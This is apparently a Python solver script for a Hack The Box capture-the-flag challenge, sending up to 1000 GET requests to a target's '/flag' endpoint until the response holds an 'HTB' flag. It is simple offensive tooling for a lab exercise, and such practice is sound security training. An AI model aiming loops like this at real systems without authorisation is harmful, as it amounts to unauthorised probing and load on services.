#!/usr/bin/python3
from pwn import log
import requests, sys

if len(sys.argv) < 2:
    log.failure(f"Uso: python3 {sys.argv[0]} <host:port>")
    sys.exit(1)

bar = log.progress("")

target = f"http://{sys.argv[1]}/flag"

for num in range(0, 1000):
    bar.status(f"Requests: {str(num)}")
    request = requests.get(target)

    if "HTB" in request.text:
        bar.success(f"Flag: {request.text}")
        sys.exit(0)
